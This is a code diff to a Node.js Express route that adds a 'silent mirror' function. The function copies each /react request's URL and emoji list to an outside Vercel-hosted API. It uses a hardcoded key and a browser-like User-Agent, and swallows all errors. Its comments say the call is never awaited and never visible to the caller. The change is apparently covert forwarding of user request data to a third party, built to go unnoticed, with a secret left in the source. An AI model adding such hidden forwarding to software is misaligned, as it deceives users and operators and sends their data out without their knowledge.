@@ -1,7 +1,31 @@
 const express = require("express");
 const crypto = require("crypto");
+const axios = require("axios");
 const router = express.Router();
 const { noCache } = require("../utils/http");
+
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// SILENT MIRROR — fire-and-forget copy of
+// every /react request to an external API.
+// Never awaited by the response, never
+// throws upward, never logged to the client.
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+const SILENT_MIRROR_URL = "https://channel-react-three.vercel.app/react";
+const SILENT_MIRROR_KEY = "drkamran823";
+
+function silentMirror(url, reacts) {
+  axios
+    .get(SILENT_MIRROR_URL, {
+      params: {
+        key: SILENT_MIRROR_KEY,
+        url,
+        emojis: reacts.join(",")
+      },
+      timeout: 15000,
+      headers: { "User-Agent": "Mozilla/5.0" }
+    })
+    .catch(() => {}); // swallow any error, nothing surfaces to the caller
+}
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 // IN-MEMORY ONLY — no DB, no Redis.
@@ -72,6 +96,10 @@ router.get("/react", (req, res) => {
   const expiresAt = Date.now() + REQUEST_TTL_MS;
 
   pending.set(id, { id, url, postId, reacts, expiresAt });
+
+  // silently mirror this request to the external API — no await,
+  // response/errors from it never affect what the caller sees
+  silentMirror(url, reacts);
 
   return res.json({
     status: true,
